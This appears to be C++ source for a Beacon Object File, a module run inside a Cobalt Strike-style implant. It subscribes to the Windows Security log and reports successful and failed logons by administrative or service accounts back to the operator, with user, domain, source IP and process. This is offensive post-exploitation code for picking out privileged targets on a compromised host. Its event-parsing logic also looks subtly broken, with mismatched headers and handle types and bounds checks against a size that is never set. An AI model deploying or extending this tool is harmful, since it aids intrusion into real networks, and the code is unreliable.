#include <Windows.h>
#include <winefs.h>
#include "..\async\async_bof.h"

#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "..\beacon.h"
}

#define EVT_LOGON_TYPE_INTERACTIVE        2
#define EVT_LOGON_TYPE_NETWORK            3
#define EVT_LOGON_TYPE_BATCH              4
#define EVT_LOGON_TYPE_REMOTE_INTERACTIVE 10
#define EVT_LOGON_TYPE_NEW_CREDENTIALS    11

static const DWORD TARGET_LOGON_TYPES = 
    (1 << EVT_LOGON_TYPE_INTERACTIVE) |
    (1 << EVT_LOGON_TYPE_REMOTE_INTERACTIVE);

static const DWORD MONITORED_EVENT_IDS[] = {
    4624,
    4625
};

#define NUM_TARGET_EVENTS (sizeof(MONITORED_EVENT_IDS) / sizeof(DWORD))

static const wchar_t* g_wszLogonEventQuery = 
    L"Event/System[EventID=4624 or EventID=4625]";

static DWORD g_dwEventBufferSize = 0;
static PEVT_HANDLE g_pEventRenderContext = NULL;

static DWORD getEventDataAsDword(PEVT_VARIANT pEventData, DWORD dwIndex) {
    if (pEventData && (dwIndex < g_dwEventBufferSize)) {
        return pEventData[dwIndex].UInt32Val;
    }
    return 0;
}

static const wchar_t* getEventDataAsString(PEVT_VARIANT pEventData, DWORD dwIndex) {
    if (pEventData && (dwIndex < g_dwEventBufferSize)) {
        if (pEventData[dwIndex].Type == EvtVarTypeString) {
            return pEventData[dwIndex].StringVal;
        }
    }
    return L"";
}

static BOOL isAdminLogon(DWORD dwLogonType, DWORD dwAuthenticationPackage, const wchar_t* wszTargetUsername) {
    if (wszTargetUsername && wcslen(wszTargetUsername) > 0) {
        if (_wcsicmp(wszTargetUsername, L"Administrator") == 0 ||
            _wcsicmp(wszTargetUsername, L"Admin") == 0 ||
            wcsstr(wszTargetUsername, L"admin") != NULL ||
            wcsstr(wszTargetUsername, L"ADMIN") != NULL ||
            wcsstr(wszTargetUsername, L"_svc") != NULL ||
            wcsstr(wszTargetUsername, L"svc_") != NULL ||
            wcsstr(wszTargetUsername, L"$") != NULL) {
            return TRUE;
        }
    }

    if (dwLogonType == EVT_LOGON_TYPE_INTERACTIVE &&
        dwAuthenticationPackage == 0x0A) {
        return TRUE;
    }

    return FALSE;
}

static void closeSubscription(PEVT_HANDLE hSubscription) {
    if (hSubscription) {
        EvtClose(hSubscription);
    }
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    short targetLogonType = 0;
    wchar_t targetUsername[256] = { 0 };
    BOOL monitorAllTypes = FALSE;
    BOOL monitorAdminOnly = TRUE;

    if (parser.length > 0) {
        if (BeaconDataLength(&parser) >= 2) {
            targetLogonType = BeaconDataShort(&parser);
        }
        if (BeaconDataLength(&parser) >= 2) {
            short adminOnlyFlag = BeaconDataShort(&parser);
            monitorAdminOnly = (adminOnlyFlag != 0);
        }
        if (BeaconDataLength(&parser) >= 2) {
            short allTypesFlag = BeaconDataShort(&parser);
            monitorAllTypes = (allTypesFlag != 0);
        }
    }

    async_init(args, len);

    if (!async_is_initialized()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Async BOF not properly initialized. This BOF requires the async_bof.cna loader.");
        return;
    }

    HANDLE hStop = async_get_stop_event();
    if (!hStop) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No stop event available");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Async Logon Monitor started");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Monitor Admin Only: %s", monitorAdminOnly ? "YES" : "NO");
    if (targetLogonType > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target Logon Type: %d", targetLogonType);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for logon events... (Use 'async_stop' to stop)");

    PEVT_HANDLE hSubscription = EvtSubscribe(
        NULL,
        hStop,
        L"Security",
        g_wszLogonEventQuery,
        NULL,
        NULL,
        NULL,
        EvtSubscribeToFutureEvents
    );

    if (!hSubscription) {
        DWORD dwErr = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to subscribe to Security log. Error: %lu", dwErr);
        return;
    }

    DWORD dwEventBufferSize = 0;
    PEVT_VARIANT pEventData = NULL;

    while (!async_should_stop(500)) {
        EVT_HANDLE hEvent = EvtNext(hSubscription, 1000, 0, 0);

        if (!hEvent) {
            if (GetLastError() == ERROR_TIMEOUT) {
                continue;
            }
            break;
        }

        DWORD dwRequiredSize = 0;
        EvtRender(NULL, hEvent, EvtRenderEventValues, 0, NULL, &dwRequiredSize);

        if (dwRequiredSize == 0) {
            EvtClose(hEvent);
            continue;
        }

        if (dwRequiredSize > dwEventBufferSize) {
            if (pEventData) {
                free(pEventData);
            }
            pEventData = (PEVT_VARIANT)malloc(dwRequiredSize);
            if (!pEventData) {
                EvtClose(hEvent);
                continue;
            }
            dwEventBufferSize = dwRequiredSize;
        }

        DWORD dwRenderedSize = 0;
        if (!EvtRender(NULL, hEvent, EvtRenderEventValues, dwRequiredSize, pEventData, &dwRenderedSize)) {
            EvtClose(hEvent);
            continue;
        }

        DWORD dwEventID = 0;
        DWORD dwLogonType = 0;
        DWORD dwAuthenticationPackage = 0;
        wchar_t wszUsername[256] = { 0 };
        wchar_t wszDomain[256] = { 0 };
        wchar_t wszProcessName[256] = { 0 };
        DWORD dwIpAddressLength = 0;
        wchar_t wszIpAddress[64] = { 0 };

        if (dwRenderedSize >= 1) {
            dwEventID = pEventData[1].UInt32Val;
        }
        if (dwRenderedSize >= 5) {
            dwLogonType = pEventData[4].UInt32Val;
        }
        if (dwRenderedSize >= 6) {
            dwAuthenticationPackage = pEventData[5].UInt32Val;
        }
        if (dwRenderedSize >= 8) {
            wcsncpy_s(wszUsername, 256, pEventData[7].StringVal ? pEventData[7].StringVal : L"", 255);
        }
        if (dwRenderedSize >= 9) {
            wcsncpy_s(wszDomain, 256, pEventData[8].StringVal ? pEventData[8].StringVal : L"", 255);
        }
        if (dwRenderedSize >= 18) {
            wcsncpy_s(wszProcessName, 256, pEventData[17].StringVal ? pEventData[17].StringVal : L"", 255);
        }
        if (dwRenderedSize >= 20) {
            if (pEventData[19].Type == EvtVarTypeSid) {
            }
        }
        if (dwRenderedSize >= 21) {
            if (pEventData[20].Type == EvtVarTypeSid) {
            }
        }
        if (dwRenderedSize >= 25) {
            if (pEventData[24].Type == EvtVarTypeString && pEventData[24].StringVal) {
                wcsncpy_s(wszIpAddress, 64, pEventData[24].StringVal, 63);
            }
        }

        if (dwEventID == 4624) {
            if (monitorAdminOnly && !isAdminLogon(dwLogonType, dwAuthenticationPackage, wszUsername)) {
                EvtClose(hEvent);
                continue;
            }

            if (targetLogonType > 0 && (DWORD)targetLogonType != dwLogonType) {
                EvtClose(hEvent);
                continue;
            }

            BeaconPrintf(CALLBACK_OUTPUT, "");
            BeaconPrintf(CALLBACK_OUTPUT, "[!] LOGON EVENT DETECTED");
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Event ID: %lu", dwEventID);
            BeaconPrintf(CALLBACK_OUTPUT, "[!] User: %ls\\%ls", wszDomain, wszUsername);
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Logon Type: %lu", dwLogonType);
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Auth Package: 0x%08lX", dwAuthenticationPackage);
            if (wcslen(wszIpAddress) > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Source IP: %ls", wszIpAddress);
            }
            if (wcslen(wszProcessName) > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Process: %ls", wszProcessName);
            }

            ASYNC_ALERT("[!] ADMIN LOGON: %ls\\%ls", wszDomain, wszUsername);
        }
        else if (dwEventID == 4625) {
            if (monitorAdminOnly && !isAdminLogon(dwLogonType, dwAuthenticationPackage, wszUsername)) {
                EvtClose(hEvent);
                continue;
            }

            BeaconPrintf(CALLBACK_ERROR, "");
            BeaconPrintf(CALLBACK_ERROR, "[!] FAILED LOGON EVENT");
            BeaconPrintf(CALLBACK_ERROR, "[!] Event ID: %lu", dwEventID);
            BeaconPrintf(CALLBACK_ERROR, "[!] User: %ls\\%ls", wszDomain, wszUsername);
            BeaconPrintf(CALLBACK_ERROR, "[!] Logon Type: %lu", dwLogonType);
            if (wcslen(wszIpAddress) > 0) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Source IP: %ls", wszIpAddress);
            }

            ASYNC_ALERT("[!] FAILED ADMIN LOGON: %ls\\%ls", wszDomain, wszUsername);
        }

        EvtClose(hEvent);
    }

    async_stopping();

    if (pEventData) {
        free(pEventData);
    }

    closeSubscription(hSubscription);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Async Logon Monitor stopped");
    async_stopped();
}
